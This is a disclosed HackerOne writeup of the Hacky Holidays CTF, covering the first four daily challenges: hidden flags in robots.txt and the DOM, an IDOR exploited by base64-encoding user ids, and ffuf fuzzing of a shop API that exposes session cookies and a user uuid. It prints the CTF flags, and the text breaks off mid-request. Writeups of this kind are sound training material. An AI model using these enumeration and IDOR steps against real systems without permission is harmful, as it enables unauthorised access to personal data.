---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/server-side-request-forgery-ssrf
  - env/web
substate: "resolved"
weakness: "Server-Side Request Forgery (SSRF)"
enriched: true
date: 2021-01-11
submitted: 2020-12-26T22:19:55.072Z
bounty_usd: null
votes: 4
cve: []
program: "[[programs/h1-ctf|h1-ctf]]"
reporter: "rykkard"
source: "https://hackerone.com/reports/1066801"
title: "Hacky Holidays CTF Writeup"
---
# Hacky Holidays CTF Writeup

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 4 | **Program:** h1-ctf | **Disclosed:** 2021-01-11

- Report: [https://hackerone.com/reports/1066801](https://hackerone.com/reports/1066801)
- CWE: Server-Side Request Forgery (SSRF)
- Submitted: 2020-12-26T22:19:55.072Z

## Timeline

- **Report Filed**
- **2020-12-30** @rykkard: # Hacky Holidays CTF Writeup

{F1138003}

We start with the announcement of the start of the event on [twitter][1], we will have one challenge every day for 12 days in a row and the final goal will be:

> **Infiltrate Grinch Networks and take them down!**

After reviewing the scope and rules on the official page of the [H1-CTF Program][2], we are left with the scope:

> **hackyholidays.h1ctf.com**

Having what is necessary at this point, it only remains to wait for the start of the CTF.

# Day 1: Grinch Networks

{F1138004}

Here we begin! checking the main page, it doesn't have many elements, after a quick look at the page source with no results..

```html
$ curl https://hackyholidays.h1ctf.com/
<!DOCTYPE html>
<html>
<head>
    <title>Grinch Networks</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="/assets/css/home.css" crossorigin="anonymous">
</head>
<body>
<video autoplay muted loop id="myVideo">
    <source src="/assets/video/snow.mp4" type="video/mp4">
</video>
<div class="content">
    <img src="/assets/images/grinch-keepout.png" height="500px">
</div>
</body>
</html>
```
At this point, before I start fuzzing, I first manually checked [Information disclosure][disclosure] with common files like:
- robots.txt
- .htaccess
- sitemap.xml

```html
$ curl https://hackyholidays.h1ctf.com/robots.txt
User-agent: *
Disallow: /s3cr3t-ar3a
Flag: flag{48104912-28b0-494a-9995-a203d1e261e7}
```
Well, it was a simple start, I'm very sure the difficulty will gradually increase.

Peeking our secret endpoint `/s3cr3t-ar3a`
```html
$ curl https://hackyholidays.h1ctf.com/s3cr3t-ar3a/
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Come Back Tomorrow</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
</head>
<body>
<div class="container text-center" style="margin-top:20px">
    <div><img src="/assets/images/grinch-networks.png" alt="Grinch Networks"></div>
    <h1>Come back tomorrow</h1>
</div>
</body>
</html>
```
Ok, we have to come back the next day.

> flag: **flag{48104912-28b0-494a-9995-a203d1e261e7}**
   next challenge: /s3cr3t-ar3a

# Day 2: Under Construction

{F1138005}

After inspecting `/s3cr3t-ar3a` page source, we can't find anything that stands out.

```html
$ curl https://hackyholidays.h1ctf.com/s3cr3t-ar3a/
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Under Construction</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
</head>
<body>
<div class="container" style="margin-top:20px">
    <div class="text-center"><img src="/assets/images/grinch-networks.png" alt="Grinch Networks"></div>
    <h1 class="text-center">Page Moved</h1>
    <div class="row">
        <div class="col-md-6 col-md-offset-3" style="margin-top:30px">
            <div class="alert alert-danger text-center" id="alertbox">
                <p>I've moved this page to keep people out!</p>
                <p>If you're allowed access you'll know where to look for the proper page!</p>
            </div>
        </div>
    </div>
</div>
<script src="/assets/js/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
</body>
</html>
```

Apparently the page has been moved, but how and where?

After trying to fuzz files and directories inside `/s3cr3t-ar3a`, no new endpoints were discovered.
There wasn't much to hit here, so how about taking a step back..

> View Source and Inspect Element are two browser features that allow developers to look at the HTML for a particular page. Although their outputs can be the same, one should not assume they will be. [source][3]

Yeah, after a good few hours wondering what I had missed, I remembered about **Inspect element**, So using DevTools with CTR+SHIFT+I > Elements tab:

```html
<!-- HTML DOM: https://hackyholidays.h1ctf.com/s3cr3t-ar3a/ -->
<html lang="en"><head>
    <title>Under Construction</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
</head>
<body>
<div class="container" style="margin-top:20px">
    <div class="text-center"><img src="/assets/images/grinch-networks.png" alt="Grinch Networks"></div>
    <h1 class="text-center">Page Moved</h1>
    <div class="row">
        <div class="col-md-6 col-md-offset-3" style="margin-top:30px">
            <div class="alert alert-danger text-center" id="alertbox" data-info="flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}" next-page="/apps">
                <p>I've moved this page to keep people out!</p>
                <p>If you're allowed access you'll know where to look for the proper page!</p>
            </div>
        </div>
    </div>
</div>
<script src="/assets/js/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
</body></html>
```
Flag found!, and we take note of the endpoint for the next challenge.

> flag: **flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}**
 next challenge: **/apps**

# Day 3: People Rater

{F1138006}

Browsing on `/apps`, we will have several challenges launched on this same endpoint apparently, Let's start with the first one, so let's move on `/people-rater`.

> People Rater
   The grinch likes to keep lists of all the people he hates. This year he's gone digital but there might be a record that doesn't belong!

{F1138007}

On `/people-rater` page source we found that it dynamically loads the people records with JavaScript, so we go on to inspect the HTML DOM.

```html
<!-- HTML DOM: https://hackyholidays.h1ctf.com/people-rater -->
<html lang="en"><head>
    <title>Grinch People Rater</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
</head>
<body>
<div class="container" style="margin-top:20px">
    <div class="text-center"><img src="/assets/images/grinch-networks.png" alt="Grinch Networks"></div>
    <h1 class="text-center">Grinch People Rater</h1>
    <div class="row">
        <div class="col-md-6 col-md-offset-3 text-center thelist"><div style="margin-bottom:15px"><a class="btn btn-info" data-id="eyJpZCI6Mn0=">Tea Avery</a></div><div style="margin-bottom:15px"><a class="btn btn-info" data-id="eyJpZCI6M30=">Mihai Matthews</a></div><div style="margin-bottom:15px"><a class="btn btn-info" data-id="eyJpZCI6NH0=">Ruth Ward</a></div><div style="margin-bottom:15px"><a class="btn btn-info" data-id="eyJpZCI6NX0=">Calvin Hogan</a></div><div style="margin-bottom:15px"><a class="btn btn-info" data-id="eyJpZCI6Nn0=">Reilly Cervantes</a></div></div>
        <div class="col-md-6 col-md-offset-3 text-center">
            <input type="button" class="btn btn-default loadmore" value="Load More">
        </div>
    </div>
</div>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
<script>
    $('.thelist').on("click", "a", function(){
        $.getJSON('/people-rater/entry?id=' + $(this).attr('data-id'), function(resp){
            alert( resp.rating );
        }).fail(function(){
            alert('Request failed');
        });
    });
    var page = 0;
    $('.loadmore').click( function(){
        page++;
        $.getJSON('/people-rater/page/' + page, function(resp){
            if( resp.results.length < 5 ){
                $('.loadmore').hide();
            }
            $.each( resp.results, function(k,v){
                $('.thelist').append('<div style="margin-bottom:15px"><a class="btn btn-info" data-id="' + v.id + '">' + v.name + '</a></div>')
            });
        });
    });
    $('.loadmore').trigger('click');
</script>
</body></html>
```
We found some base64 encoded values there, went to intercept http traffic with [Burp Suite][burp] and we got:

```html
GET /people-rater/entry?id=eyJpZCI6Mn0= HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
X-Requested-With: XMLHttpRequest
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://hackyholidays.h1ctf.com/people-rater
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 14 Dec 2020 17:05:45 GMT
Content-Type: application/json
Connection: close
Content-Length: 57

{"id":"eyJpZCI6Mn0=","name":"Tea Avery","rating":"Awful"}
```
We got access to personal data, maybe we have an [IDOR][IDOR] vulnerability?, After base64 decoding `eyJpZCI6Mn0=` we got a value which we can play with:

```bash
$ echo eyJpZCI6Mn0=| base64 -d
{"id":2}
```

At this point we can create our attack vector with [Burp Suite][burp] and its extension [Hackvector][hackvector] .

```html
GET /people-rater/entry?id=<@base64url_0>{"id":2}<@/base64url_0> HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
X-Requested-With: XMLHttpRequest
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://hackyholidays.h1ctf.com/people-rater
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es-419;q=0.8,es;q=0.7
```

Fuzzing by `id` values, we got as information:

```plain
{"id":0}
["Entry not found"]

{"id":1}
{"id":"eyJpZCI6MX0=","name":"The Grinch","rating":"Amazing in every possible way!","flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"}

{"id":2} 
{"id":"eyJpZCI6MTd9","name":"Charlton Dillon","rating":"Boring"}

{"id":3} -> {"id":17}
<more-users>

{"id":18}
["Entry not found"]
```
With `id=1` we have found the Grinch record and our flag.

> flag: **flag{b705fb11-fb55-442f-847f-0931be82ed9a}**
 next challenge: **/apps**

# Day 4: Swag Shop

New challenge on `/apps`, This time our new endpoint is: `/swag-shop`

> Swag Shop
 Get your Grinch Merch! Try and find a way to pull the Grinch's personal details from the online shop.

{F1138008}

Inspecting `/swag-shop` page source we found calls to an API:
```html
$ curl https://hackyholidays.h1ctf.com/swag-shop/ -sk
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Grinch Swag Shop</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
    <style>
        div.product-box{margin-bottom:20px}div.product-box div.product-name{color:#6cc8fa;font-size:18px}div.product-box div.product-cost{margin:10px 0 10px 0}
    </style>
</head>
<body>
<div class="container" style="margin-top:20px">
    <div class="text-center"><img src="/assets/images/grinch-networks.png" alt="Grinch Networks"></div>
    <h1 class="text-center" style="margin-bottom:30px">Grinch Swag Shop</h1>
    <div class="row">
        <div class="col-md-8 col-md-offset-2">
            <div class="row product-holder"></div>
        </div>
    </div>
</div>
<div class="modal fade" id="login_modal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
    <div class="modal-dialog" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                <h4 class="modal-title" id="myModalLabel">Login To Your Account</h4>
            </div>
            <div class="modal-body">
                <div><label>Username</label></div>
                <div><input class="form-control" name="username"></div>
                <div style="margin-top:7px"><label>Password</label></div>
                <div><input class="form-control" type="password" name="password"></div>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
                <button type="button" class="btn btn-primary loginbtn">Login</button>
            </div>
        </div>
    </div>
</div>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
<script>
    $.getJSON("/swag-shop/api/stock",function(o){$.each(o.products,function(o,t){$(".product-holder").append('<div class="col-md-4 product-box"><div><img class="img-responsive" src="/assets/images/product_image_coming_soon.jpg"></div><div class="text-center product-name">'+t.name+'</div><div class="text-center product-cost">&dollar;'+t.cost+'</div><div class="text-center"><input type="button" data-product-id="'+t.id+'" class="btn btn-success purchase" value="Purchase"></div></div>')}),$("input.purchase").click(function(){$.post("/swag-shop/api/purchase",{id:$(this).attr("data-product-id")},function(o){window.location="/swag-shop/checkout/"+o.checkoutURL}).fail(function(){$("#login_modal").modal("show")})})}),$(".loginbtn").click(function(){$.post("/swag-shop/api/login",{username:$('input[name="username"]').val(),password:$('input[name="password"]').val()},function(o){document.cookie("token="+o.token),window.location="/swag-shop"}).fail(function(){alert("Login Failed")})});
</script>
</body>
</html>
```

We have more elements now, so after browsing and reviewing each one, we have as summary:

- `/swag-shop`: home page, only allow to purchase items, it redirects you to login.
    - `/swag-shop/api`:  status code 404.
        - `/swag-shop/api/login`: POST, valid credentials required.
        - `/swag-shop/api/purchase`: POST, status code 401, login required.
    - `/swag-shop/checkout/<some_id>`:  status code 404, requires some valid id.

As next step, we did fuzzing on `/swag-shop/api` using [ffuf][ffuf] and [objects.txt][objects.txt] as wordlist.

```bash
$ ffuf -u https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ -t 50 -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -X POST -fc 404 -mc all
<..>
login                   [Status: 400, Size: 35, Words: 3, Lines: 1]
purchase                [Status: 401, Size: 33, Words: 5, Lines: 1]
:: Progress: [3132/3132] :: Job [1/1] :: 370 req/sec :: Duration: [0:00:07] :: Errors: 0 ::

$ ffuf -u https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ -t 50 -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -X GET -fc 404 -mc all
<..>
sessions                [Status: 200, Size: 2194, Words: 1, Lines: 1]
user                    [Status: 400, Size: 35, Words: 3, Lines: 1]
:: Progress: [3132/3132] :: Job [1/1] :: 445 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```

got two new API endpoints: `/swag-shop/api/sessions` and  `/swag-shop/api/user`, lets check them

```html
GET /swag-shop/api/sessions HTTP/1.1
Host: hackyholidays.h1ctf.com
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 15 Dec 2020 19:57:59 GMT
Content-Type: application/json
Connection: close
Content-Length: 2194

{"sessions":["eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0=","eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRFJtWVRCaE4yRmlOalk1TUdGbE9XRm1ZVEU0WmpFMk4ySmpabVl6WldKa09UUmxPR1l3TWpJMU9HSXlOak0xT0RVME5qYzJZVGRsWlRNNE16RmlNMkkxTVRVek16VmlNakZoWXpWa01UYzRPREUzT0dNNFkySmxPVGs0TWpKbE1ESTJZalF6WkRReE1HTm1OVGcxT0RReFpqQm1PREJtWldReFptRTFZbUU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNMlEyTURJek5EZzVNV0UwTjJNM05ESm1OVEl5TkdNM05XVXhZV1EwTkRSbFpXSTNNVGc0TWpJM1pHUmtNVGxsWlRNMlpEa3hNR1ZsTldFd05tWmlaV0ZrWmpaaE9EZzRNRFkzT0RsbVpHUmhZVE0xWTJJeU1HVmhNakExTmpkaU5ERmpZekJoTVdRNE5EVTFNRGM0TkRFMVltSTVZVEpqT0RCa01qRm1OMlk9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNV1kzTVRBek1UQmpaR1k0WkdNd1lqSTNaamsyWm1Zek1XSmxNV0V5WlRnMVl6RTBNbVpsWmpNd1ltSmpabVE0WlRVMFkyWXhZelZtWlRNMU4yUTFPRFkyWWpGa1ptRmlObUk1WmpJMU0yTTJNRFZpTmpBMFpqRmpORFZrTlRRNE4yVTJPRGRpTlRKbE1tRmlNVEV4T0RBNE1qVTJNemt4WldOaE5qRmtObVU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRE00WXpoaU4yUTNNbVkwWWpVMk0yRmtabUZsTkRNd01USTVNakV5T0RobE5HRmtNbUk1T1RjeU1EbGtOVEpoWlRjNFlqVXhaakl6TjJRNE5tUmpOamcyTm1VMU16VmxPV0V6T1RFNU5XWXlPVGN3Tm1KbFpESXlORGd5TVRBNVpEQTFPVGxpTVRZeU5EY3pOakZrWm1VME1UZ3hZV0V3TURVMVpXTmhOelE9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJPR0kzTjJFeE9HVmpOek0xWldWbU5UazJaak5rWmpJd00yWmpZemRqTVdOaE9EZzRORGhoT0RSbU5qSTBORFJqWlRkbFpUZzBaVFV3TnpabVpEZGtZVEpqTjJJeU9EWTVZamN4Wm1JNVpHUmlZVGd6WmpoaVpEVmlPV1pqTVRWbFpEZ3pNVEJrTnpObU9ESTBPVE01WkRNM1kySmpabVk0TnpFeU9HRTNOVE09In0="]}
```

```html
GET /swag-shop/api/user/ HTTP/1.1
Host: hackyholidays.h1ctf.com
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close

HTTP/1.1 400 Bad Request
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 15 Dec 2020 20:08:47 GMT
Content-Type: application/json
Connection: close
Content-Length: 35

{"error":"Missing required fields"}
```

Both request are juicy!, first lets retrieve those base64 values on `/swag-shop/api/sessions` and decode them

```bash
# .sessions[]
$ cat data.txt
eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=
eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0=
eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==
eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRFJtWVRCaE4yRmlOalk1TUdGbE9XRm1ZVEU0WmpFMk4ySmpabVl6WldKa09UUmxPR1l3TWpJMU9HSXlOak0xT0RVME5qYzJZVGRsWlRNNE16RmlNMkkxTVRVek16VmlNakZoWXpWa01UYzRPREUzT0dNNFkySmxPVGs0TWpKbE1ESTJZalF6WkRReE1HTm1OVGcxT0RReFpqQm1PREJtWldReFptRTFZbUU9In0=
eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNMlEyTURJek5EZzVNV0UwTjJNM05ESm1OVEl5TkdNM05XVXhZV1EwTkRSbFpXSTNNVGc0TWpJM1pHUmtNVGxsWlRNMlpEa3hNR1ZsTldFd05tWmlaV0ZrWmpaaE9EZzRNRFkzT0RsbVpHUmhZVE0xWTJJeU1HVmhNakExTmpkaU5ERmpZekJoTVdRNE5EVTFNRGM0TkRFMVltSTVZVEpqT0RCa01qRm1OMlk9In0=
eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNV1kzTVRBek1UQmpaR1k0WkdNd1lqSTNaamsyWm1Zek1XSmxNV0V5WlRnMVl6RTBNbVpsWmpNd1ltSmpabVE0WlRVMFkyWXhZelZtWlRNMU4yUTFPRFkyWWpGa1ptRmlObUk1WmpJMU0yTTJNRFZpTmpBMFpqRmpORFZrTlRRNE4yVTJPRGRpTlRKbE1tRmlNVEV4T0RBNE1qVTJNemt4WldOaE5qRmtObVU9In0=
eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRE00WXpoaU4yUTNNbVkwWWpVMk0yRmtabUZsTkRNd01USTVNakV5T0RobE5HRmtNbUk1T1RjeU1EbGtOVEpoWlRjNFlqVXhaakl6TjJRNE5tUmpOamcyTm1VMU16VmxPV0V6T1RFNU5XWXlPVGN3Tm1KbFpESXlORGd5TVRBNVpEQTFPVGxpTVRZeU5EY3pOakZrWm1VME1UZ3hZV0V3TURVMVpXTmhOelE9In0=
eyJ1c2VyIjpudWxsLCJjb29raWUiOiJPR0kzTjJFeE9HVmpOek0xWldWbU5UazJaak5rWmpJd00yWmpZemRqTVdOaE9EZzRORGhoT0RSbU5qSTBORFJqWlRkbFpUZzBaVFV3TnpabVpEZGtZVEpqTjJJeU9EWTVZamN4Wm1JNVpHUmlZVGd6WmpoaVpEVmlPV1pqTVRWbFpEZ3pNVEJrTnpObU9ESTBPVE01WkRNM1kySmpabVk0TnpFeU9HRTNOVE09In0=

$ cat data.txt |base64 -d |jq .
{
  "user": null,
  "cookie": "YzVmNTJiYTNkOWFlYTY2YjA1ZTY1NDBlNmI0YmZjMmNmZGYzMzg1MWJkZDcyMzY0ZTFlYjdmNDY3NDkzNzIwMGNiZjNhMjQ3Y2RmY2E2N2FmMzdjM2I0ZWNlZTVkM2VkNzU3MTUwYjdkYzkyNWI4Y2I3ZWZiNjk2N2NjOTk0MjU="
}
{
  "user": null,
  "cookie": "ZjM2MzNjM2JkZGUyMzVmMmY2ZjcxNjdlNDNmZjQwZTlmY2RhNjYxNWM5Y2Y1ZjY2ODU3NjkxMTQ2Nzk0ZmIxOWZhN2ZhZjg0Y2E5Nzk1NTQ2MzMzZTc0MWJlMzVhZDA0MDUwYmQ3NDlmZTE4MmNkMjMxMzU0MWRlMTJhNWYzOGQ="
}
{
  "user": "C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
  "cookie": "NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="
}
{
  "user": null,
  "cookie": "MDRmYTBhN2FiNjY5MGFlOWFmYTE4ZjE2N2JjZmYzZWJkOTRlOGYwMjI1OGIyNjM1ODU0Njc2YTdlZTM4MzFiM2I1MTUzMzViMjFhYzVkMTc4ODE3OGM4Y2JlOTk4MjJlMDI2YjQzZDQxMGNmNTg1ODQxZjBmODBmZWQxZmE1YmE="
}
{
  "user": null,
  "cookie": "M2Q2MDIzNDg5MWE0N2M3NDJmNTIyNGM3NWUxYWQ0NDRlZWI3MTg4MjI3ZGRkMTllZTM2ZDkxMGVlNWEwNmZiZWFkZjZhODg4MDY3ODlmZGRhYTM1Y2IyMGVhMjA1NjdiNDFjYzBhMWQ4NDU1MDc4NDE1YmI5YTJjODBkMjFmN2Y="
}
{
  "user": null,
  "cookie": "MWY3MTAzMTBjZGY4ZGMwYjI3Zjk2ZmYzMWJlMWEyZTg1YzE0MmZlZjMwYmJjZmQ4ZTU0Y2YxYzVmZTM1N2Q1ODY2YjFkZmFiNmI5ZjI1M2M2MDViNjA0ZjFjNDVkNTQ4N2U2ODdiNTJlMmFiMTExODA4MjU2MzkxZWNhNjFkNmU="
}
{
  "user": null,
  "cookie": "MDM4YzhiN2Q3MmY0YjU2M2FkZmFlNDMwMTI5MjEyODhlNGFkMmI5OTcyMDlkNTJhZTc4YjUxZjIzN2Q4NmRjNjg2NmU1MzVlOWEzOTE5NWYyOTcwNmJlZDIyNDgyMTA5ZDA1OTliMTYyNDczNjFkZmU0MTgxYWEwMDU1ZWNhNzQ="
}
{
  "user": null,
  "cookie": "OGI3N2ExOGVjNzM1ZWVmNTk2ZjNkZjIwM2ZjYzdjMWNhODg4NDhhODRmNjI0NDRjZTdlZTg0ZTUwNzZmZDdkYTJjN2IyODY5YjcxZmI5ZGRiYTgzZjhiZDViOWZjMTVlZDgzMTBkNzNmODI0OTM5ZDM3Y2JjZmY4NzEyOGE3NTM="
}
```

We got many cookies and one value `C7DCCE-0E0DAB-B20226-FC92EA-1B9043`, likely an user uuid?.
  
 Continuing with the endpoint `/swag-shop/api/user/`, We are missing parameters here, after fuzzing manually with values as: `id`, `uuid`, and so on.

```html
GET /swag-shop/api/user/?uuid= HTTP/1.1
Host: hackyholidays.h1ctf.com
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close

HTTP/1.1 404 Not Found
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 15 Dec 2020 20:05:05 GMT
Content-Type: application/json
Connection: close
Content-Length: 40

{"error":"Could not find matching uuid"}
``` 

Cool!, we have one parameter `uuid` and one likely valid user uuid from our previous step.

```html
GET /swag-shop/api/user/?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043 HTTP/1.1
Host: hackyholidays.h1ctf.com
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
